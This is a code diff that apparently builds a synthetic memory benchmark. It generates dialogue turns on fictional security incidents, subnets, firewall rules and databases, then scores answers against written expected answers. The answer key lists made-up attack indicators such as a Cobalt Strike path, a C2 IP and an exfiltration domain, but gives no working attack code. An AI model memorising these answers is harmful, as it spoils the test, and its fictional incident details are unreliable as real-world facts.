+                f"Status: {inc['status']}. Severity: {inc['severity']}. "
+                f"Affected systems: {systems_text}. "
+                f"IOCs: {iocs_text}. CVEs: {cves_text}. "
+                f"Timeline: {timeline_text}."
+            )
+            facts = [
+                {"entity": inc["id"], "attribute": "title", "value": inc["title"]},
+                {"entity": inc["id"], "attribute": "status", "value": inc["status"]},
+                {"entity": inc["id"], "attribute": "severity", "value": inc["severity"]},
+                {"entity": inc["id"], "attribute": "affected_systems", "value": systems_text},
+                {"entity": inc["id"], "attribute": "iocs", "value": iocs_text},
+            ]
+            if inc["cves"]:
+                facts.append({"entity": inc["id"], "attribute": "cves", "value": cves_text})
+
+            for f in facts:
+                ek = f"{f['entity']}.{f['attribute']}"
+                facts_by_entity.setdefault(ek, []).append({"value": f["value"], "turn": turn_idx})
+                current_values[ek] = f["value"]
+
+            turns.append(
+                Turn(turn_number=turn_idx, content=content, block=10, block_name="incidents", facts=facts)
+            )
+            turn_idx += 1
+
+        # Incident updates (evolving status)
+        incident_updates = []
+        for inc in INCIDENTS:
+            for upd in inc.get("updates", []):
+                target_pct = upd["turn_pct"]
+                target_turn = b_start + int(target_pct * (b_end - b_start))
+                incident_updates.append((target_turn, inc, upd))
+        incident_updates.sort(key=lambda x: x[0])
+
+        for target_turn, inc, upd in incident_updates:
+            if turn_idx >= b_end:
+                break
+            while turn_idx < min(target_turn, b_end):
+                content = f"No updates on active incidents. Monitoring continues for {rng.choice(INCIDENTS)['id']}."
+                turns.append(
+                    Turn(turn_number=turn_idx, content=content, block=10, block_name="incidents", facts=[])
+                )
+                turn_idx += 1
+
+            if turn_idx >= b_end:
+                break
+
+            old_status = current_values.get(f"{inc['id']}.status", inc["status"])
+            content = (
+                f"Incident update {inc['id']}: Status changed from {old_status} to {upd['new_status']}. "
+                f"Detail: {upd['detail']}."
+            )
+            facts = [
+                {"entity": inc["id"], "attribute": "status", "value": upd["new_status"], "supersedes": old_status},
+            ]
+
+            ek = f"{inc['id']}.status"
+            superseded_values.setdefault(ek, []).append(
+                {"old_value": old_status, "new_value": upd["new_status"], "turn": turn_idx, "reason": upd["detail"]}
+            )
+            facts_by_entity.setdefault(ek, []).append({"value": upd["new_status"], "turn": turn_idx})
+            current_values[ek] = upd["new_status"]
+
+            turns.append(
+                Turn(turn_number=turn_idx, content=content, block=10, block_name="incidents", facts=facts)
+            )
+            turn_idx += 1
+
+        while turn_idx < b_end:
+            turns.append(
+                Turn(turn_number=turn_idx, content="Incident monitoring continues. No new updates.", block=10, block_name="incidents", facts=[])
+            )
+            turn_idx += 1
+
+    # Block 11: Infrastructure inventory
+    if len(scaled_blocks) > 10:
+        b_start, b_end, _ = scaled_blocks[10]
+
+        # Subnets
+        for subnet in INFRASTRUCTURE["subnets"]:
+            if turn_idx >= b_end:
+                break
+            content = (
+                f"Infrastructure: Subnet '{subnet['name']}' with CIDR {subnet['cidr']} "
+                f"in {subnet['az']}. Purpose: {subnet['purpose']}."
+            )
+            facts = [
+                {"entity": f"subnet_{subnet['name']}", "attribute": "cidr", "value": subnet["cidr"]},
+                {"entity": f"subnet_{subnet['name']}", "attribute": "purpose", "value": subnet["purpose"]},
+                {"entity": f"subnet_{subnet['name']}", "attribute": "az", "value": subnet["az"]},
+            ]
+            for f in facts:
+                ek = f"{f['entity']}.{f['attribute']}"
+                facts_by_entity.setdefault(ek, []).append({"value": f["value"], "turn": turn_idx})
+                current_values[ek] = f["value"]
+            turns.append(
+                Turn(turn_number=turn_idx, content=content, block=11, block_name="infrastructure", facts=facts)
+            )
+            turn_idx += 1
+
+        # Load balancers
+        for lb in INFRASTRUCTURE["load_balancers"]:
+            if turn_idx >= b_end:
+                break
+            content = (
+                f"Infrastructure: Load balancer '{lb['name']}' ({lb['type']}) "
+                f"targeting {lb['target']} on ports {lb['ports']}. SSL cert: {lb['ssl_cert']}."
+            )
+            facts = [
+                {"entity": f"lb_{lb['name']}", "attribute": "type", "value": lb["type"]},
+                {"entity": f"lb_{lb['name']}", "attribute": "target", "value": lb["target"]},
+                {"entity": f"lb_{lb['name']}", "attribute": "ssl_cert", "value": lb["ssl_cert"]},
+            ]
+            for f in facts:
+                ek = f"{f['entity']}.{f['attribute']}"
+                facts_by_entity.setdefault(ek, []).append({"value": f["value"], "turn": turn_idx})
+                current_values[ek] = f["value"]
+            turns.append(
+                Turn(turn_number=turn_idx, content=content, block=11, block_name="infrastructure", facts=facts)
+            )
+            turn_idx += 1
+
+        # Kubernetes clusters
+        for k8s in INFRASTRUCTURE["kubernetes_clusters"]:
+            if turn_idx >= b_end:
+                break
+            content = (
+                f"Infrastructure: Kubernetes cluster '{k8s['name']}' v{k8s['version']} "
+                f"with {k8s['nodes']} nodes in subnet {k8s['subnet']}. "
+                f"Namespaces: {k8s['namespace_count']}, Pods: {k8s['pod_count']}."
+            )
+            facts = [
+                {"entity": f"k8s_{k8s['name']}", "attribute": "version", "value": k8s["version"]},
+                {"entity": f"k8s_{k8s['name']}", "attribute": "nodes", "value": str(k8s["nodes"])},
+                {"entity": f"k8s_{k8s['name']}", "attribute": "subnet", "value": k8s["subnet"]},
+                {"entity": f"k8s_{k8s['name']}", "attribute": "pod_count", "value": str(k8s["pod_count"])},
+            ]
+            for f in facts:
+                ek = f"{f['entity']}.{f['attribute']}"
+                facts_by_entity.setdefault(ek, []).append({"value": f["value"], "turn": turn_idx})
+                current_values[ek] = f["value"]
+            turns.append(
+                Turn(turn_number=turn_idx, content=content, block=11, block_name="infrastructure", facts=facts)
+            )
+            turn_idx += 1
+
+        # Firewall rules
+        for fw in INFRASTRUCTURE["firewall_rules"]:
+            if turn_idx >= b_end:
+                break
+            content = (
+                f"Infrastructure: Firewall rule '{fw['name']}' - {fw['action'].upper()} "
+                f"from {fw['source']} to {fw['dest']} on ports {fw['ports']}."
+            )
+            facts = [
+                {"entity": f"fw_{fw['name']}", "attribute": "action", "value": fw["action"]},
+                {"entity": f"fw_{fw['name']}", "attribute": "source", "value": fw["source"]},
+                {"entity": f"fw_{fw['name']}", "attribute": "dest", "value": fw["dest"]},
+            ]
+            for f in facts:
+                ek = f"{f['entity']}.{f['attribute']}"
+                facts_by_entity.setdefault(ek, []).append({"value": f["value"], "turn": turn_idx})
+                current_values[ek] = f["value"]
+            turns.append(
+                Turn(turn_number=turn_idx, content=content, block=11, block_name="infrastructure", facts=facts)
+            )
+            turn_idx += 1
+
+        # DNS records
+        for dns in INFRASTRUCTURE["dns_records"]:
+            if turn_idx >= b_end:
+                break
+            content = (
+                f"Infrastructure: DNS record {dns['name']} ({dns['type']}) "
+                f"-> {dns['target']}, TTL {dns['ttl']}s."
+            )
+            facts = [
+                {"entity": f"dns_{dns['name']}", "attribute": "type", "value": dns["type"]},
+                {"entity": f"dns_{dns['name']}", "attribute": "target", "value": dns["target"]},
+            ]
+            for f in facts:
+                ek = f"{f['entity']}.{f['attribute']}"
+                facts_by_entity.setdefault(ek, []).append({"value": f["value"], "turn": turn_idx})
+                current_values[ek] = f["value"]
+            turns.append(
+                Turn(turn_number=turn_idx, content=content, block=11, block_name="infrastructure", facts=facts)
+            )
+            turn_idx += 1
+
+        # Databases
+        for db in INFRASTRUCTURE["databases"]:
+            if turn_idx >= b_end:
+                break
+            content = (
+                f"Infrastructure: Database '{db['name']}' running {db['engine']} "
+                f"at {db['host']}:{db['port']}, size {db['size_gb']}GB."
+            )
+            facts = [
+                {"entity": f"db_{db['name']}", "attribute": "engine", "value": db["engine"]},
+                {"entity": f"db_{db['name']}", "attribute": "host", "value": db["host"]},
+                {"entity": f"db_{db['name']}", "attribute": "size_gb", "value": str(db["size_gb"])},
+            ]
+            for f in facts:
+                ek = f"{f['entity']}.{f['attribute']}"
+                facts_by_entity.setdefault(ek, []).append({"value": f["value"], "turn": turn_idx})
+                current_values[ek] = f["value"]
+            turns.append(
+                Turn(turn_number=turn_idx, content=content, block=11, block_name="infrastructure", facts=facts)
+            )
+            turn_idx += 1
+
+        # Pad remaining infrastructure turns
+        infra_items = (
+            list(INFRASTRUCTURE["subnets"])
+            + list(INFRASTRUCTURE["kubernetes_clusters"])
+            + list(INFRASTRUCTURE["databases"])
+        )
+        while turn_idx < b_end:
+            item = infra_items[turn_idx % len(infra_items)]
+            name = item.get("name", "unknown")
+            turns.append(
+                Turn(turn_number=turn_idx, content=f"Infrastructure status check: {name} is operational.", block=11, block_name="infrastructure", facts=[])
+            )
+            turn_idx += 1
+
+    # Block 12: Problem-solving tasks
+    if len(scaled_blocks) > 11:
+        b_start, b_end, _ = scaled_blocks[11]
+        ps_idx = 0
+        while turn_idx < b_end and ps_idx < len(PROBLEM_TASKS):
+            task = PROBLEM_TASKS[ps_idx]
+            context_str = "; ".join(task["context_facts"])
+            content = (
+                f"Problem-solving task: {task['task']}. "
+                f"Context: {context_str}. "
+                f"Expected approach: {task['expected_approach']}."
+            )
+            facts = [
+                {"entity": f"problem_task_{ps_idx}", "attribute": "task", "value": task["task"]},
+                {"entity": f"problem_task_{ps_idx}", "attribute": "expected_approach", "value": task["expected_approach"]},
+            ]
+            for cf in task["context_facts"]:
+                facts.append({"entity": f"problem_task_{ps_idx}", "attribute": "context", "value": cf})
+
+            for f in facts:
+                ek = f"{f['entity']}.{f['attribute']}"
+                facts_by_entity.setdefault(ek, []).append({"value": f["value"], "turn": turn_idx})
+                current_values[ek] = f["value"]
+
+            turns.append(
+                Turn(turn_number=turn_idx, content=content, block=12, block_name="problem_solving", facts=facts)
+            )
+            turn_idx += 1
+            ps_idx += 1
+
+        # Cycle tasks if more turns needed
+        while turn_idx < b_end:
+            task = PROBLEM_TASKS[turn_idx % len(PROBLEM_TASKS)]
+            turns.append(
+                Turn(
+                    turn_number=turn_idx,
+                    content=f"Reminder: pending task - {task['task'][:100]}...",
+                    block=12,
+                    block_name="problem_solving",
+                    facts=[],
+                )
+            )
+            turn_idx += 1
+
     # Pad any remaining turns
     while turn_idx < num_turns:
         turns.append(
@@ -1379,6 +2062,9 @@ def generate_dialogue(num_turns: int = 1000, seed: int = 42) -> GroundTruth:
         )
         turn_idx += 1
 
+    elapsed = time.time() - gen_start
+    logger.info("Dialogue generation complete: %d turns in %.2fs", len(turns), elapsed)
+
     return GroundTruth(
         turns=turns,
         facts_by_entity=facts_by_entity,
@@ -1390,7 +2076,9 @@ def generate_dialogue(num_turns: int = 1000, seed: int = 42) -> GroundTruth:
 def _delivered_entities(ground_truth: GroundTruth) -> set[str]:
     """Return set of entity names whose facts were delivered in the dialogue."""
     entities: set[str] = set()
+    block_names: set[str] = set()
     for turn in ground_truth.turns:
+        block_names.add(turn.block_name)
         for fact in turn.facts:
             entities.add(fact.get("entity", ""))
     # Also add block names and topics from content
@@ -1402,6 +2090,10 @@ def _delivered_entities(ground_truth: GroundTruth) -> set[str]:
         for proj in PROJECTS:
             if f"project {proj['name'].lower()}" in content_lower:
                 entities.add(f"Project {proj['name']}")
+    # Track which block types were delivered for conditional question generation
+    entities.add("__block_names__")
+    for bn in block_names:
+        entities.add(f"__block:{bn}__")
     return entities
 
 
@@ -2179,6 +2871,318 @@ def generate_questions(ground_truth: GroundTruth, num_questions: int = 100) -> l
     ]
     questions.extend(meta_questions[:meta_count])
 
+    # Category 8: Security log analysis (conditional on security blocks being delivered)
+    has_security = "__block:security_logs__" in delivered
+    if has_security:
+        sec_log_count = max(1, int(8 * scale))
+        sec_log_questions = [
+            Question(
+                question_id="seclog_01",
+                text="How many failed SSH logins came from IP 192.168.1.45?",
+                expected_answer="6 failed SSH logins (3 as admin, 3 as root) before a successful login as admin",
+                category="security_log_analysis",
+                relevant_turns=[],
+                scoring_dimensions=["factual_accuracy", "specificity"],
+            ),
+            Question(
+                question_id="seclog_02",
+                text="What was the brute force attack pattern from 192.168.1.45?",
+                expected_answer="6 failed SSH logins alternating between admin and root users within seconds (14:23:01 to 14:23:18), followed by a successful login as admin at 14:23:22, then a privilege escalation attempt at 14:30:00",
+                category="security_log_analysis",
+                relevant_turns=[],
+                scoring_dimensions=["factual_accuracy", "temporal_awareness", "specificity"],
+            ),
+            Question(
+                question_id="seclog_03",
+                text="What ports were scanned by 10.0.0.50?",
+                expected_answer="Ports 22, 80, 443, 3306, 5432, 8080, 8443",
+                category="security_log_analysis",
+                relevant_turns=[],
+                scoring_dimensions=["factual_accuracy", "specificity"],
+            ),
+            Question(
+                question_id="seclog_04",
+                text="What malware was detected on 10.0.0.5 and what lateral movement technique was used?",
+                expected_answer="Cobalt Strike beacon was detected in /tmp/.hidden/payload.exe. Lateral movement via PsExec targeting 10.0.0.6 and 10.0.0.7",
+                category="security_log_analysis",
+                relevant_turns=[],
+                scoring_dimensions=["factual_accuracy", "specificity"],
+            ),
+            Question(
+                question_id="seclog_05",
+                text="How many critical severity events were logged?",
+                expected_answer="Multiple critical events including: successful SSH login after brute force, privilege escalation, SQL injection, C2 connection, RDP brute force, Cobalt Strike, database dump, ransomware, supply chain compromise, golden ticket, CloudTrail disabled, container escape, AWS key exposure, zero-day exploit, SSRF, SIEM correlation alert",
+                category="security_log_analysis",
+                relevant_turns=[],
+                scoring_dimensions=["factual_accuracy", "specificity"],
+            ),
+            Question(
+                question_id="seclog_06",
+                text="What data exfiltration indicators were detected?",
+                expected_answer="2.3GB data transfer from 172.16.0.100 to external IP 185.220.101.45, anomalous DNS query to data.exfil.evil.com, connection to known C2 server at 185.220.101.45",
+                category="security_log_analysis",
+                relevant_turns=[],
+                scoring_dimensions=["factual_accuracy", "specificity"],
+            ),
+            Question(
+                question_id="seclog_07",
+                text="What supply chain attack was detected and what CVE was involved?",
+                expected_answer="Malicious dependency in event-stream@5.0.0 package, and CVE-2024-3094 (xz-utils/sshd backdoor)",
+                category="security_log_analysis",
+                relevant_turns=[],
+                scoring_dimensions=["factual_accuracy"],
+            ),
+            Question(
+                question_id="seclog_08",
+                text="What phishing attempt was detected and who was targeted?",
+                expected_answer="Phishing email to hr_inbox with subject 'Urgent: Update your credentials' from support@1egit-company.com (note the '1' instead of 'l')",
+                category="security_log_analysis",
+                relevant_turns=[],
+                scoring_dimensions=["factual_accuracy", "specificity"],
+            ),
+        ]
+        sec_log_questions = [
+            q for q in sec_log_questions if _question_references_delivered(q, delivered, ground_truth)
+        ]
+        questions.extend(sec_log_questions[:sec_log_count])
+
+    # Category 9: Incident tracking (conditional on incidents block)
+    has_incidents = "__block:incidents__" in delivered
+    if has_incidents:
+        incident_count = max(1, int(6 * scale))
+        incident_questions = [
+            Question(
+                question_id="incident_01",
+                text="What is the current status of INC-2024-001?",
+                expected_answer="Closed. The ransomware attempt was contained, files restored from backup, attacker C2 blocked, and post-incident review completed with MFA enforced for all admin accounts.",
+                category="incident_tracking",
+                relevant_turns=[],
+                scoring_dimensions=["factual_accuracy", "temporal_awareness"],
+            ),
+            Question(
+                question_id="incident_02",
+                text="Which incident involved data exfiltration and how many customers were affected?",
+                expected_answer="INC-2024-002: Data exfiltration via compromised svc_backup service account. 2.3GB exfiltrated, breach notification sent to 15,000 affected customers.",
+                category="incident_tracking",
+                relevant_turns=[],
+                scoring_dimensions=["factual_accuracy", "specificity"],
+            ),
+            Question(
+                question_id="incident_03",
+                text="What APT group was attributed to the development infrastructure attack?",
+                expected_answer="INC-2024-003: TTPs matched APT29 (likely state-sponsored). The attack involved supply chain compromise (event-stream), crypto mining on CI server, DNS tunneling, and xz-utils backdoor (CVE-2024-3094).",
+                category="incident_tracking",
+                relevant_turns=[],
+                scoring_dimensions=["factual_accuracy", "specificity"],
+            ),
+            Question(
+                question_id="incident_04",
+                text="How was the AWS key exposure in INC-2024-004 resolved?",
+                expected_answer="Key immediately revoked, CloudTrail audit showed key was used 3 times before revocation but no customer data was accessed (only listed buckets). Git-secrets hook deployed to all repos with mandatory pre-commit scanning.",
+                category="incident_tracking",
+                relevant_turns=[],
+                scoring_dimensions=["factual_accuracy", "temporal_awareness"],
+            ),
+            Question(
+                question_id="incident_05",
+                text="Which incidents have CVEs associated with them?",
+                expected_answer="INC-2024-001 has CVE-2024-21626, and INC-2024-003 has CVE-2024-3094 (xz-utils backdoor)",
+                category="incident_tracking",
+                relevant_turns=[],
+                scoring_dimensions=["factual_accuracy", "specificity"],
+            ),
+            Question(
+                question_id="incident_06",
+                text="What was the timeline of the insider threat incident?",
+                expected_answer="INC-2024-006: DLP alert at 14:00 for bulk download of 500+ sensitive documents, account suspended at 14:30, HR/Legal notified and device confiscated at 15:00. User had resigned 2 weeks prior and was downloading competitor-sensitive data. Legal action initiated.",
+                category="incident_tracking",
+                relevant_turns=[],
+                scoring_dimensions=["factual_accuracy", "temporal_awareness", "specificity"],
+            ),
+        ]
+        incident_questions = [
+            q for q in incident_questions if _question_references_delivered(q, delivered, ground_truth)
+        ]
+        questions.extend(incident_questions[:incident_count])
+
+    # Category 10: Infrastructure knowledge (conditional on infrastructure block)
+    has_infra = "__block:infrastructure__" in delivered
+    if has_infra:
+        infra_count = max(1, int(6 * scale))
+        infra_questions = [
+            Question(
+                question_id="infra_01",
+                text="Which subnet hosts the production Kubernetes cluster?",
+                expected_answer="The k8s-prod cluster (v1.29, 12 nodes) runs in the prod-app subnet (10.0.2.0/24)",
+                category="infrastructure_knowledge",
+                relevant_turns=[],
+                scoring_dimensions=["factual_accuracy", "specificity"],
+            ),
+            Question(
+                question_id="infra_02",
+                text="What firewall rule prevents development from accessing production?",
+                expected_answer="Rule 'deny-dev-to-prod' blocks all ports from 10.0.6.0/24 (dev) to 10.0.1.0/24, 10.0.2.0/24, 10.0.3.0/24 (prod subnets)",
+                category="infrastructure_knowledge",
+                relevant_turns=[],
+                scoring_dimensions=["factual_accuracy", "specificity"],
+            ),
+            Question(
+                question_id="infra_03",
+                text="What database engine is used for the primary database and how large is it?",
+                expected_answer="PostgreSQL 16 on pg-primary at 10.0.3.10:5432, 450GB with 2 replicas",
+                category="infrastructure_knowledge",
+                relevant_turns=[],
+                scoring_dimensions=["factual_accuracy", "specificity"],
+            ),
+            Question(
+                question_id="infra_04",
+                text="What DNS record points to the database primary?",
+                expected_answer="db-primary.internal (A record) points to 10.0.3.10 with 60s TTL",
+                category="infrastructure_knowledge",
+                relevant_turns=[],
+                scoring_dimensions=["factual_accuracy", "specificity"],
+            ),
+            Question(
+                question_id="infra_05",
+                text="How many Kubernetes pods are running across all clusters?",
+                expected_answer="226 total pods: k8s-prod has 156, k8s-staging has 42, k8s-dev has 28",
+                category="infrastructure_knowledge",
+                relevant_turns=[],
+                scoring_dimensions=["factual_accuracy", "specificity"],
+            ),
+            Question(
+                question_id="infra_06",
+                text="What is the purpose of the DMZ subnet and what is its CIDR?",
+                expected_answer="The DMZ subnet (10.0.4.0/24) in us-east-1a is for public-facing services",
+                category="infrastructure_knowledge",
+                relevant_turns=[],
+                scoring_dimensions=["factual_accuracy"],
+            ),
+        ]
+        infra_questions = [
+            q for q in infra_questions if _question_references_delivered(q, delivered, ground_truth)
+        ]
+        questions.extend(infra_questions[:infra_count])
+
+    # Category 11: Problem solving (conditional on problem_solving block)
+    has_problems = "__block:problem_solving__" in delivered
+    if has_problems:
+        problem_count = max(1, int(4 * scale))
+        problem_questions = [
+            Question(
+                question_id="problem_01",
+                text="What approach should be used to extract IPs with more than 5 failed logins from the auth log?",
+                expected_answer="Use an awk/grep pipeline with sort | uniq -c | sort -rn, filtering for 'Failed' keyword. Auth log is at /var/log/auth.log with format: timestamp user source_ip action.",
+                category="problem_solving",
+                relevant_turns=[],
+                scoring_dimensions=["factual_accuracy", "specificity"],
+            ),
+            Question(
+                question_id="problem_02",
+                text="What Terraform resources are needed for the DMZ subnet with WAF?",
+                expected_answer="azurerm_subnet + azurerm_web_application_firewall_policy with OWASP 3.2 ruleset. DMZ CIDR is 10.0.4.0/24 on Azure.",
+                category="problem_solving",
+                relevant_turns=[],
+                scoring_dimensions=["factual_accuracy", "specificity"],
+            ),
+            Question(
+                question_id="problem_03",
+                text="What SIEM rule format and parameters should be used to detect the APT kill chain?",
+                expected_answer="Sigma rule format correlating port_scan + exploit + psexec + large_transfer events within a 24-hour time window, minimum confidence threshold 0.8",
+                category="problem_solving",
+                relevant_turns=[],
+                scoring_dimensions=["factual_accuracy", "specificity"],
+            ),
+            Question(
+                question_id="problem_04",
+                text="What approach should be used to detect DNS tunneling with Suricata?",
+                expected_answer="Suricata rule using dns.query with PCRE for high-entropy base64-like subdomains, entropy threshold > 3.5 bits/char, on Suricata IDS version 7",
+                category="problem_solving",
+                relevant_turns=[],
+                scoring_dimensions=["factual_accuracy", "specificity"],
+            ),
+        ]
+        problem_questions = [
+            q for q in problem_questions if _question_references_delivered(q, delivered, ground_truth)
+        ]
+        questions.extend(problem_questions[:problem_count])
+
+    # Category 12: Multi-hop reasoning (chains across blocks)
+    multi_hop_count = max(1, int(6 * scale))
+    multi_hop_questions: list[Question] = []
+
+    # 2-hop questions (always available - chain across original blocks)
+    multi_hop_questions.extend([
+        Question(
+            question_id="multihop_01",
+            text="Which person from the Security team has a pet, and what project changes happened related to security?",
+            expected_answer="James O'Brien is on the Security team and has a border collie named Scout. Project Atlas had 5 critical security vulnerabilities found, then 3 patched, then all resolved. Atlas also hired 3 contractors for a security audit.",
+            category="multi_hop_reasoning",
+            relevant_turns=[],
+            scoring_dimensions=["factual_accuracy", "specificity"],
+            chain_length=2,
+        ),
+        Question(
+            question_id="multihop_02",
+            text="The person who leads the AI/ML team's project was transferred to someone with a PhD. What is that PhD in and from where?",
+            expected_answer="Fatima Al-Hassan led Project Echo (AI-powered customer support chatbot) and moved to research. Yuki Tanaka replaced her; Yuki has a PhD in Statistics from MIT.",
+            category="multi_hop_reasoning",
+            relevant_turns=[],
+            scoring_dimensions=["factual_accuracy", "specificity"],
+            chain_length=2,
+        ),
+        Question(
+            question_id="multihop_03",
+            text="Which project's budget increase was closest in dollar amount to the monthly AWS bill?",
+            expected_answer="Project Beacon increased by $150K ($800K to $950K), and the monthly AWS bill is $127K. Delta increased by $200K. So Beacon's increase ($150K) is closest to the $127K AWS bill.",
+            category="multi_hop_reasoning",
+            relevant_turns=[],
+            scoring_dimensions=["factual_accuracy", "specificity"],
+            chain_length=2,
+        ),
+    ])
+
+    # 3-hop questions (conditional on security blocks for richer chains)
+    if has_security and has_incidents:
+        multi_hop_questions.extend([
+            Question(
+                question_id="multihop_04",
+                text="Which CVE affects the system targeted by the attacker using the IP that performed the brute force SSH attack, and what incident is it part of?",
+                expected_answer="The brute force SSH attack came from 192.168.1.45. After successful login, privilege escalation was attempted. The broader APT campaign (INC-2024-003) included CVE-2024-3094 (xz-utils/sshd backdoor) and CVE-2024-21626 was associated with INC-2024-001 (ransomware).",
+                category="multi_hop_reasoning",
+                relevant_turns=[],
+                scoring_dimensions=["factual_accuracy", "specificity"],
+                chain_length=3,
+            ),
+            Question(
+                question_id="multihop_05",
+                text="The C2 server IP appears in both the security logs and an incident report. Which incident, what was the status progression, and what data was exfiltrated?",
+                expected_answer="IP 185.220.101.45 appears as a C2 server connection in security logs from 172.16.0.100 (svc_backup). This is INC-2024-002 (data exfiltration). Status: active -> investigating -> contained -> remediated. 2.3GB was exfiltrated, and breach notification was sent to 15,000 customers.",
+                category="multi_hop_reasoning",
+                relevant_turns=[],
+                scoring_dimensions=["factual_accuracy", "temporal_awareness", "specificity"],
+                chain_length=3,
+            ),
+        ])
+
+    if has_security and has_infra:
+        multi_hop_questions.extend([
+            Question(
+                question_id="multihop_06",
+                text="The firewall was changed to allow RDP from the internet. Which subnet was affected, and what infrastructure sits behind that subnet's load balancer?",
+                expected_answer="The firewall rule change opened port 3389 (RDP) from 0.0.0.0/0. The management subnet (10.0.5.0/24) handles monitoring. The production subnets are protected by ALB (alb-prod-web targeting prod-web) and NLB (nlb-prod-api targeting prod-app for port 8443).",
+                category="multi_hop_reasoning",
+                relevant_turns=[],
+                scoring_dimensions=["factual_accuracy", "specificity"],
+                chain_length=3,
+            ),
+        ])
+
+    multi_hop_questions = [
+        q for q in multi_hop_questions if _question_references_delivered(q, delivered, ground_truth)
+    ]
+    questions.extend(multi_hop_questions[:multi_hop_count])
+
     # Add bonus questions to fill up to num_questions if needed
     bonus_questions = [
         Question(
@@ -2324,4 +3328,8 @@ __all__ = [
     "TECHNICAL_DOMAINS",
     "NUMERICAL_DATA",
     "CONTRADICTORY_REPORTS",
+    "SECURITY_EVENTS",
+    "INCIDENTS",
+    "INFRASTRUCTURE",
+    "PROBLEM_TASKS",
 ]
